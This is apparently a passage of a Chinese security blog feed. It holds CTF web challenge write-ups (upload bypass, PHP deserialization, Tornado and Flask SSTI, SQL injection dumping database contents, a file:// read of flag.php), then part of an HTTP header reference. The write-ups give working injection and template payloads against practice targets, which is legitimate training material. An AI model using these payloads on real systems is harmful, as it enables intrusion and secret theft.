<p>对字符串执行 ROT13 转换,ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p>
</blockquote>
<p>php源码，审计之后发现是需要解密miwen即可得到flag</p>
<p>加密过程代码上已经给了，只需要再逆过来就可以了</p>
<pre><code class="hljs plaintext">&lt;?php
$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
$miwen=base64_decode(strrev(str_rot13($miwen)));
echo $miwen;
$m=$miwen;
        
    for($i=0;$i&lt;strlen($m);$i++)&#123;
       
        $_c=substr($m,$i,1);
        $__=ord($_c)-1;  # 字符转数字再减1
        $__=chr($__);  # 数字转字符
        $_=$_.$__;    # 拼接字符串
    &#125; 
    echo strrev($_);
?&gt;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071404130.png?x-oss-process=hzy" alt="image-20220707140427899"></p>
<h1>upload1</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071411427.png?x-oss-process=hzy" alt="image-20220707141126268"></p>
<p>前端校验只能上传图片，抓包看看<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071414269.png?x-oss-process=hzy" alt="image-20220707141445124"></p>
<p>显示上传上去了，改后缀一样可以</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071415706.png?x-oss-process=hzy" alt="image-20220707141518574"></p>
<p>显然是我大题小作了，就是个简单的前端校验，直接连就行了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071416792.png?x-oss-process=hzy" alt="image-20220707141624652"></p>
<h1>unserialize3</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261223649.png?x-oss-process=hzy" alt="image-20220626122348573"></p>
<p>魔法函数_wakeup。</p>
<p>wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，这也是本题的绕过点。</p>
<blockquote>
<p>serialize()和unserialize()函数对魔术方法的处理：serialize()函数会检查类中是否存在一个魔术方法__sleep()  。如果存在，该方法会先被调用，然后才执行序列化操作，此功能可以用于清理对象。</p>
<p>unserialize()函数会检查类中是否存在一个魔术方法__wakeup()，如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</p>
</blockquote>
<p>payload如下</p>
<pre><code class="hljs plaintext">&lt;?php
class xctf&#123;
public $flag = &#x27;111&#x27;;
public function __wakeup()&#123;
exit(&#x27;bad requests&#x27;);
&#125;
&#125;
$a = new xctf();
print(serialize($a));

?&gt;</code></pre>
<pre><code class="hljs plaintext">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;    //1--&gt;2即可绕过魔法函数</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261235408.png?x-oss-process=hzy" alt="image-20220626123536332"></p>
<blockquote>
<p>当被反序列化的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时__wakeup也会失效，实现绕过</p>
</blockquote>
<h1>easytornado</h1>
<blockquote>
<p>Tornado 框架</p>
</blockquote>
<ul>
<li><em><strong>Tornado 的 SSTI 漏洞</strong></em></li>
<li><em><strong>Tornado 中的 cookie_secret 值</strong></em></li>
<li><em><strong>Python3 中的 hashlib 模块</strong></em></li>
</ul>
<p>题目提示框架漏洞，谷歌找利用就行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261242097.png?x-oss-process=hzy" alt="image-20220626124211039"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261242766.png?x-oss-process=hzy" alt="image-20220626124222711"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261244469.png?x-oss-process=hzy" alt="image-20220626124409420"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261244068.png?x-oss-process=hzy" alt="image-20220626124415019"></p>
<p>直接访问不行</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261247806.png?x-oss-process=hzy" alt="image-20220626124725754"></p>
<pre><code class="hljs plaintext">但是发现http://111.200.241.244:57423/error?msg=Error对应Error，经过测试也证实了这一点</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261248119.png?x-oss-process=hzy" alt="image-20220626124816070"></p>
<p>存在ssti</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261249699.png?x-oss-process=hzy" alt="image-20220626124928654"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261249527.png?x-oss-process=hzy" alt="image-20220626124921471"></p>
<p>但是有注入被过滤了</p>
<p>这个时候注意利用hint</p>
<pre><code class="hljs plaintext">md5(cookie_secret+md5(filename))
//  该表达式的结果应该是对应着 URL 中的 filehash 参数的值。我们已经知道了存放 flag 的文件名，那么我们只需要得到相应的 filehash 参数的值，就可以构造 URL 进而得到 flag，观察该表达式，filename 是我们已知的，所以我们只要知道 cookie_secret 所对应的值，便可以计算出该表达式的结果。</code></pre>
<blockquote>
<p>在 Tornado 中，通过在 tornado.web.Application 中添加 cookie_secret 参数，我们就可以使用 set_secure_cookie() 和 get_secure_cookie() 函数来发送和取得浏览器的 cookies ，借助该参数可以对 cookie 进行简易加密以防止 Cookie 被恶意篡改。</p>
</blockquote>
<p>框架漏洞不拿手，参考别人wp才做出来</p>
<p>构造payload</p>
<pre><code class="hljs plaintext">msg=&#123;&#123;handler.settings&#125;&#125; 即可获取到 cookie_secret</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261253486.png?x-oss-process=hzy" alt="image-20220626125307468"></p>
<p>既然 filename 和 cookie_secret 我们都知道了，接下来我们就可以借助 Python 脚本来计算相应表达式的值</p>
<pre><code class="hljs plaintext">#导入hashlib模块
import hashlib

#获取一个md5加密算法对象
md = hashlib.md5()
#用提供的 字节串 更新此哈希对象(hash object)的状态。
md.update(&#x27;/fllllllllllllag&#x27;.encode(&#x27;utf-8&#x27;))
#NOTICE：
#update()方法需要接收的参数是一个字节对象。
#向对象中传入字节串时，必须为编码类型。可以使用字符串前b&#x27; &#x27;的方法或使用.encode(&#x27;UTF-8&#x27;)的方法，使字符串变为bytes类型

#以十六进制数字字符串的形式返回摘要值（哈希函数计算后生成的值就叫做摘要或者摘要值）
fact = md.hexdigest()

md = hashlib.md5()
md.update((&#x27;5d1bf6b4-a2ca-413b-a504-87c986ed69ec&#x27; + fact).encode(&#x27;utf-8&#x27;))
print(md.hexdigest())</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261255479.png?x-oss-process=hzy" alt="image-20220626125552423"></p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/qq_45805420/article/details/107876871">(43条消息) XCTF系列 // Web | easytornado_Ga1axy_z的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_42193179/article/details/104520896">(43条消息) python3 hashlib.md5()_update()_digest()_hexdigest().py_学无止境慢慢来的博客-CSDN博客_hashlib.md5().update</a></p>
<p>[<a href="https://www.jianshu.com/p/c4070d6f4249">护网杯 2018]easy_tornado - 简书 (jianshu.com)</a></p>
<h1>shrine</h1>
<ul>
<li>沙盒逃逸</li>
<li>ssti</li>
</ul>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261258255.png?x-oss-process=hzy" alt="image-20220626125804186"></p>
<p>不难看出是python</p>
<pre><code class="hljs plaintext">import flask
import os

app = flask.Flask(__name__)

app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)

@app.route(&#x27;/&#x27;)
def index():
    return open(__file__).read()\

@app.route(&#x27;/shrine/&#x27;)
def shrine(shrine):
   
   def safe_jinja(s):
       s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)
       blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]
       return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c)for c in blacklist]) + s
       return flask.render_template_string(safe_jinja(shrine))
if __name__ == &#x27;__main__&#x27;:
    app.run(debug=True)</code></pre>
<p><a href="https://so.csdn.net/so/search?q=flask&amp;spm=1001.2101.3001.7020">flask</a>框架</p>
<p>访问路径存在ssti</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261259631.png?x-oss-process=hzy" alt="image-20220626125932579"></p>
<p>他将config和self当成了黑名单 而flag在config文件里，如果没有黑名单的时候，我们可以传入 config，但当这些被过滤的时候，我们需要借助一些全局变量利用沙盒逃逸的方法，来调用被禁用的函数对象。</p>
<blockquote>
<p>current_app,这是全局变量代理，查看他的config即可</p>
</blockquote>
<p>payload如下</p>
<pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206261302920.png?x-oss-process=hzy" alt="image-20220626130240859"></p>
<p>也可以获取全局文本</p>
<pre><code class="hljs plaintext">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</code></pre>
<p>ps：我感觉第一个比较好理解</p>
<p>参考：</p>
<p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107698218">(43条消息) 攻防世界web进阶区shrine详解_無名之涟的博客-CSDN博客</a></p>
<h1>fakebook</h1>
<ul>
<li>SSRF</li>
<li>sql注入</li>
</ul>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071553783.png?x-oss-process=hzy" alt="image-20220707155352650"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071547367.png?x-oss-process=hzy" alt="image-20220707154734277"></p>
<p>首先先注册一个进去</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071547806.png?x-oss-process=hzy" alt="image-20220707154756724"></p>
<p>然后目录扫描能找到robots.txt和flag.php</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071556887.png?x-oss-process=hzy" alt="image-20220707155614776"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071548858.png?x-oss-process=hzy" alt="image-20220707154834772"></p>
<p>访问这个得到的是源码，简单分析一下</p>
<pre><code class="hljs plaintext">&lt;?php
class UserInfo
&#123;
    public $name = &quot;&quot;;
    public $age = 0;
    public $blog = &quot;&quot;;

   public function __construct($name, $age, $blog)
    &#123;
        $this-&gt;name = $name;
        $this-&gt;age = (int)$age;
        $this-&gt;blog = $blog;
    &#125;

    function get($url)
    &#123;
        $ch = curl_init();    // 初始化一个curl会话

        curl_setopt($ch, CURLOPT_URL, $url); // 设置需要抓取的url
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // 设置curl参数，要求结果保存到字符串还是输出到屏幕上
        $output = curl_exec($ch); // 运行curl，请求网页
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); // 获取一个curl连接资源句柄的信息
        if($httpCode == 404) &#123;
            return 404;
        &#125;
        curl_close($ch); // 关闭curl会话

        return $output;
    &#125;

    public function getBlogContents ()
    &#123;
        return $this-&gt;get($this-&gt;blog);
    &#125;

    public function isValidBlog ()
    &#123;
        $blog = $this-&gt;blog;
        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
    &#125;

&#125;</code></pre>
<p>发现这个有个get传参<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071554550.png?x-oss-process=hzy" alt="image-20220707155455446"></p>
<p>加个引号就会报错<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071555816.png?x-oss-process=hzy" alt="image-20220707155512719"></p>
<p>通过order by 判断列为4，大于4或小于均4报错，因此判断此列为4</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071601614.png?x-oss-process=hzy" alt=""></p>
<p>经过测试对字符进行了一定的过滤</p>
<pre><code class="hljs plaintext">-1 /**/union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata --+</code></pre>
<p>通过注释符对其进行绕过<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071604351.png?x-oss-process=hzy" alt="image-20220707160324120">获取到数据库：fakebook,information_schema,mysql,performance_schema,test</p>
<pre><code class="hljs plaintext">获取表 // 表名为users
-1 /**/union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;--+</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071605311.png?x-oss-process=hzy" alt="image-20220707160500215"></p>
<pre><code class="hljs plaintext">获取字段
-1 /**/union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=&quot;fakebook&quot;--+</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071605948.png?x-oss-process=hzy" alt="image-20220707160546839"></p>
<pre><code class="hljs plaintext">获取字段信息
-1 /**/union/**/select 1,group_concat(data),3,4 from fakebook.users --+</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071607102.png?x-oss-process=hzy" alt="image-20220707160757019"></p>
<p>在这里可以看到我们提交的数据进行了序列化</p>
<pre><code class="hljs plaintext">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:14:&quot;hzy2003628.top&quot;;&#125;,O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;aaaqq&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:5:&quot;j.com&quot;;&#125;</code></pre>
<p>那我们可以试试能不能使用反序列化读取到flag文件</p>
<pre><code class="hljs plaintext">-1 /**/union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;aaa&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27; --+</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071613183.png?x-oss-process=hzy" alt="image-20220707161356095"></p>
<p>解码得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207071615711.png?x-oss-process=hzy" alt="image-20220707161528602"></p>
<p>一下午就写这些，害，累了，跑路了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202206251740867.jpeg?x-oss-process=hzy" alt="img"></p>
</script></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP头部信息分析</title>
    <url>/2022/02/05/%E6%9C%80%E5%85%A8%E7%9A%84HTTP%E5%A4%B4%E9%83%A8%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>HTTP头部信息分析</p>
<span id="more"></span>
<h1 id="概述">概述</h1>
<p>HTTP得头域包括通用头，请求头，响应头和实体头四个部分，每个头域都由一个域名，冒号和域值三部分组成。</p>
<ul>
<li>
<p>通用头部：指的是可以应用于请求和响应中，但是不能应用于消息内容自身的HTTP首部，取决于应用的上下文环境，通用首部可以是响应头部或者请求头部，但是不可以是实体头部。</p>
</li>
<li>
<p>最常见的通用首部包括：Date，Cache-Control，Connection</p>
</li>
<li>
<p>请求头部：是请求报文特有的，并且和请求主体无关。比如客户端希望接收到什么类型的数据，像Accept头部。</p>
</li>
</ul>
<blockquote>
<p>并非所有出现在请求中的HTTP首部都属于请求头，例如在POST请求中经常出现的Content-Length实际上是一个代表请求主体大小的entity header，当然这也可以叫做请求头。</p>
</blockquote>
<p>下面这就是一个HTTP请求的请求头：</p>
<pre><code class="hljs plaintext">GET /home.html HTTP/1.1
Host: developer.mozilla.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://developer.mozilla.org/testpage.html
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 18 Jul 2016 02:36:04 GMT
If-None-Match: &quot;c561c68d0ba92bbeb8b0fff2a9199f722e3a621a&quot;
Cache-Control: max-age=0</code></pre>
<p>严格来说下面这个例子中的 Content-Length 不是一个请求头，而是一个实体头（entity header）：</p>
<pre><code class="hljs plaintext">POST /myform.html HTTP/1.1
Host: developer.mozilla.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:50.0) Gecko/20100101 Firefox/50.0
Content-Length: 128    //实际是请求的body长度</code></pre>
<ul>
<li>响应头部：被用于http响应中并且和响应消息主体无关的那一类HTTP header。<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Response_header">详细的在这</a>像Age，Location和Server都属于响应头，他们都用于描述响应。</li>
</ul>
<blockquote>
<p>并非所有出现在响应中的http header都属于响应头，例如Content- Length就是一个代表响应体消息大小的entity header，当然也是可以叫他响应头的。</p>
</blockquote>
<p>下边这个就是GET请求的响应头，需要注意的是严格来说，Content-Encoding和Content-Type都属于entity headers(实体头部)。</p>
<pre><code class="hljs plaintext">200 OK
Access-Control-Allow-Origin: *
Connection: Keep-Alive
Content-Encoding: gzip
Content-Type: text/html; charset=utf-8
Date: Mon, 18 Jul 2016 16:06:00 GMT
Etag: &quot;c561c68d0ba92bbeb8b0f612a9199f722e3a621a&quot;
Keep-Alive: timeout=5, max=997
Last-Modified: Mon, 18 Jul 2016 02:36:04 GMT
Server: Apache
Set-Cookie: mykey=myvalue; expires=Mon, 17-Jul-2017 16:06:00 GMT; Max-Age=31449600; Path=/; secure
Transfer-Encoding: chunked
Vary: Cookie, Accept-Encoding
X-Backend-Server: developer2.webapp.scl3.mozilla.com
X-Cache-Info: not cacheable; meta data too large
X-kuma-revision: 1085259
x-frame-options: DENY</code></pre>
<ul>
<li>实体头部：用来描述消息体内容。实体报头既可以用于请求也可以用于响应中，如Content-Length，Content-Language，Content-Encoding之类的报头都是实体报头。</li>
</ul>
<blockquote>
<p>尽管实体报头既不是请求也不是响应报头，但是它经常出现在请求头或响应头中，所以还是把他们包含在一个概念里。</p>
</blockquote>
<h1 id="消息头">消息头</h1>
<h3 id="1-genaral-headers">1、Genaral headers</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Cache-Control</td>
<td>控制缓存的行为； <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cache-Control">详情</a>                                  请求：no-cache（不要缓存的实体，要求现在从WEB服务器去取）<br> max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象）<br>max-stale：（可以接受过去的对象，但是过期时间必须小于max-stale 值）<br> min-fresh：（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）<br> 响应：public(可以用 Cached 内容回应任何用户)<br>private（只能用缓存内容回应先前请求该内容的那个用户）<br>no-cache（可以缓存，但是只有在跟WEB服务器验证了其有效后，才能返回给客户端）<br> max-age：（本响应包含的对象的过期时间）<br>ALL: no-store（不允许缓存）</td>
</tr>
<tr>
<td>Connection</td>
<td>决定当前的事务完成后，是否会关闭网络连接； <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Connection">详情</a>                                                        请求：close（告诉WEB服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。 keepalive（告诉WEB服务器或者代理服务器，在完成本次请求的 响应后，保持连接，等待本次连接的后续请求）。                       响应：close（连接已经关闭）。               keepalive（连接保持着，在等待本次连接的后续请求）。</td>
</tr>
<tr>
<td>Date</td>
<td>创建报文的日期时间；</td>
</tr>
<tr>
<td>Keep-Alive</td>
<td>用来设置超时时长和最大请求数；如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。<br> 例如：Keep-Alive：300</td>
</tr>
<tr>
<td>Via</td>
<td>代理服务器的相关信息；列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面        添加 Via 头部，并填上自己的相关信息当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的Via头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0 <a href="http://236-81.D07071953.sina.com.cn:80">236-81.D07071953.sina.com.cn:80</a> (squid/2.6.STABLE13)</td>
</tr>
<tr>
<td>Warning</td>
<td>错误通知；</td>
</tr>
<tr>
<td>Trailer</td>
<td>允许发送方在分块发送的消息后面添加额外的元信息；</td>
</tr>
<tr>
<td>Transfer-Encoding</td>
<td>指定报文主体的传输编码方式；WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）做了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked</td>
</tr>
<tr>
<td>Upgrade</td>
<td>升级为其他协议；</td>
</tr>
</tbody>
</table>
<h3 id="2-request-headers">2、Request headers</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept</td>
<td>客户端可以处理的内容类型；告诉WEB服务器自己接受什么介质类型，<em>/</em> 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>客户端可以处理的字符集类型；浏览器申明自己接收的字符集</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>客户端能够理解的内容编码方式；浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法 （gzip，deflate）</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>客户端可以理解的自然语言；浏览器申明自己接收的语言语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk等等。</td>
</tr>
<tr>
<td>Authorization</td>
<td>Web 认证信息；当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，该头部来回应自己的身份验证信息给WEB服务器。</td>
</tr>
<tr>
<td>Cookie</td>
<td>通过Set-Cookie设置的值；</td>
</tr>
<tr>
<td>DNT</td>
<td>表明用户对于网站追踪的偏好；</td>
</tr>
<tr>
<td>From</td>
<td>用户的电子邮箱地址；</td>
</tr>
<tr>
<td>Host</td>
<td>请求资源所在服务器；客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。</td>
</tr>
<tr>
<td>If-Match</td>
<td>比较实体标记（ETag）；如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>比较资源的更新时间；如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>比较实体标记（与 If-Match 相反）；如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。</td>
</tr>
<tr>
<td>If-Range</td>
<td>资源未更新时发送实体 Byte 的范围请求；浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分 给我，如果对象改变了，就把整个对象给我。 浏览器通过发送请求对象的 ETag 或者 自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否 改变了。总是跟 Range 头部一起使用。</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>比较资源的更新时间（与 If-Modified-Since 相反）；如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）。</td>
</tr>
<tr>
<td>Origin</td>
<td>表明了请求来自于哪个站点；</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>代理服务器要求客户端的认证信息；浏览器响应代理服务器的身份验证请求，提供自己的身份信息</td>
</tr>
<tr>
<td>Range</td>
<td>实体的字节范围请求；浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。<br> 例如：Range: bytes=1173546-</td>
</tr>
<tr>
<td>Referer</td>
<td>对请求中 URI 的原始获取方；浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br>  例如：Referer：<a href="https://hzy2003628.top/">https://hzy2003628.top/</a><br></td>
</tr>
<tr>
<td>TE</td>
<td>指定用户代理希望使用的传输编码类型；</td>
</tr>
<tr>
<td>Upgrade-Insecure-Requests</td>
<td>表示客户端优先选择加密及带有身份验证的响应；</td>
</tr>
<tr>
<td>User-Agent</td>
<td>浏览器信息；浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14</td>
</tr>
</tbody>
</table>
<h5 id="accept">Accept</h5>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Accept">详情</a><br>
告诉WEB服务器自己接受什么介质类型，用<a href="https://blog.csdn.net/m0_45406092/article/details/107384911">MIME类型</a>来表示。<br>
<em>/</em> 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type</p>
<pre><code class="hljs yaml"><span class="hljs-attr">Accept:</span> <span class="hljs-string">&lt;MIME_type&gt;/&lt;MIME_subtype&gt;</span>
<span class="hljs-attr">Accept:</span> <span class="hljs-string">&lt;MIME_type&gt;/*</span>
<span class="hljs-attr">Accept:</span> <span class="hljs-string">*/*</span>

<span class="hljs-string">//</span> <span class="hljs-string">Multiple</span> <span class="hljs-string">types,</span> <span class="hljs-attr">weighted with the quality value syntax:</span>
<span class="hljs-attr">Accept:</span> <span class="hljs-string">text/html,</span> <span class="hljs-string">application/xhtml+xml,</span> <span class="hljs-string">application/xml;q=0.9,</span> <span class="hljs-string">*/*;q=0.8</span>
<span class="hljs-number">123456</span></code></pre>
<blockquote>
<p>如果请求中的<code>Accept</code>指定的类型和响应返回的类型不一致，会出现<code>406</code>，<code>not acceptable</code>错误</p>
</blockquote>
<p>发送请求时设置期望返回类型为’application/json’</p>
<pre><code class="hljs javascript"><span class="hljs-keyword">let</span> headers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Headers</span>();
headers.<span class="hljs-title function_">append</span>(<span class="hljs-string">&#x27;Accept&#x27;</span>, <span class="hljs-string">&#x27;application/json&#x27;</span>);
<span class="hljs-number">12</span></code></pre>
<p>Dropwizard服务端实际返回</p>
<pre><code class="hljs java"><span class="hljs-meta">@POST</span>   
<span class="hljs-meta">@Produces(MediaType.TEXT_PLAIN)</span>     <span class="hljs-comment">//返回一个字符串text/plain类型的值</span>
<span class="hljs-meta">@Timed</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">create</span><span class="hljs-params">(<span class="hljs-meta">@Context</span> HttpServletRequest request)</span>&#123;
<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;abc&quot;</span>      <span class="hljs-comment">//返回一个字符串类型的值</span>
&#125;
<span class="hljs-number">123456</span></code></pre>
<p>通过F12查看完整的请求</p>
<pre><code class="hljs java">Genaral 
    Request Method: POST        
    Status Code: <span class="hljs-number">406</span> Not Acceptable
Response     
   Content-Length: <span class="hljs-number">48</span>                               <span class="hljs-comment">//返回的消息体长度</span>
   Content-Type: application/json;charset=utf-<span class="hljs-number">8</span>    <span class="hljs-comment">//返回的消息体类型</span>
   
<span class="hljs-number">1234567</span></code></pre>
<p>返回的消息体内容为 <code>&#123;&quot;code&quot;:406,&quot;message&quot;:&quot;HTTP 406 Not Acceptable&quot;&#125;</code>，长度刚好为48</p>
<h3 id="3-response-headers">3、Response Headers</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept-Ranges</td>
<td>是否接受字节范围请求；WEB服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。</td>
</tr>
<tr>
<td>Age</td>
<td>消息对象在缓存代理中存贮的时长，以秒为单位；当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。</td>
</tr>
<tr>
<td>Clear-Site-Data</td>
<td>表示清除当前请求网站有关的浏览器数据（cookie，存储，缓存）；</td>
</tr>
<tr>
<td>Content-Security-Policy</td>
<td>允许站点管理者在指定的页面控制用户代理的资源；</td>
</tr>
<tr>
<td>Content-Security-Policy-Report-Only</td>
<td></td>
</tr>
<tr>
<td>ETag</td>
<td>资源的匹配信息；链接描述.就是一个对象（比如URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改， 所以，ETag 的作用跟 Last-Modified 的 用差不多，主要供 WEB 服务器 判断一个对象是否改变了。  比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给 WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件 有没有改变了。</td>
</tr>
<tr>
<td>Location</td>
